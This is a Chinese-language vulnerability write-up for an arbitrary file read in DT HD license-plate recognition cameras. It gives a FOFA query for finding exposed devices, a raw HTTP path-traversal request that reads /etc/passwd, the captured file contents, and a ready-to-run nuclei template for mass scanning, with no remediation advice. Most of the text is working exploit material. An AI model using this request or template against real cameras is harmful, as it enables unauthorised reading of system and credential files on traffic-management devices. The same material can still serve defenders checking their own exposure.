**漏洞名称**

DT高清车牌识别摄像机存在任意文件读取漏洞

**漏洞影响**

DT高清车牌识别摄像机

**漏洞描述**

DT高清车牌识别摄像机是一种高科技产品，主要用于抓拍和识别车牌信息，用于交通管理、违章抓拍、电子收费等目的。DT-高清车牌识别摄像机/路径处存在任意文件读取漏洞，会导致敏感信息泄露。

**FOFA搜索语句**

```
app="DT-高清车牌识别摄像机"
```

**漏洞复现**

```yaml
GET /../../../../etc/passwd HTTP/1.1
Host: x.x.x.x
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
Accept: */*
Accept-Encoding: gzip, deflate
Connection: keep-alive
```

响应内容如下

```yaml

HTTP/1.1 200 OK
Connection: close
Content-Length: 726
Content-Type: text/html

root:x:0:0:root:/home/root:/bin/sh
bin:*:1:1:bin:/bin:
daemon:*:2:2:daemon:/usr/sbin:
sys:*:3:3:sys:/dev:
adm:*:4:4:adm:/var/adm:
lp:*:5:7:lp:/var/spool/lpd:
sync:*:6:8:sync:/bin:/bin/sync
shutdown:*:7:9:shutdown:/sbin:/sbin/shutdown
halt:*:8:10:halt:/sbin:/sbin/halt
mail:*:9:11:mail:/var/spool/mail:
news:*:10:12:news:/var/spool/news:
uucp:*:11:13:uucp:/var/spool/uucp:
operator:*:12:0:operator:/root:
games:*:13:100:games:/usr/games:
ftp:*:15:14:ftp:/var/ftp:
man:*:16:100:man:/var/cache/man:
telnetd:*:17:100:telnetd:/var/tmp:
nobody:*:65534:65534:nobody:/home:/bin/sh
avahi:x:500:103:Linux User,,,:/home/avahi:/bin/sh
avahi-autoipd:x:501:104:Linux User,,,:/home/avahi-autoipd:/bin/sh
user:x:518:518::/mnt/upgrade:/bin/sh
```

**nuclei poc**

```yaml

id: dt-camera-readFile

info:
  name: DT高清车牌识别摄像机存在任意文件读取漏洞
  author: fgz
  severity: high
  description: DT高清车牌识别摄像机是一种高科技产品，主要用于抓拍和识别车牌信息，用于交通管理、违章抓拍、电子收费等目的。DT-高清车牌识别摄像机存在任意文件读取漏洞，恶意攻击者可能利用该漏洞读取服务器上的敏感文件。
  metadata:
    max-request: 1
    fofa-query: app="DT-高清车牌识别摄像机"
    verified: true
requests:
  - raw:
      - |+
        GET /../../../../etc/passwd HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
        Accept-Encoding: gzip, deflate
        Accept: */*
        Connection: keep-alive

    matchers:
      - type: dsl
        dsl:
          - "status_code == 200 && contains(body, 'root:')"
```

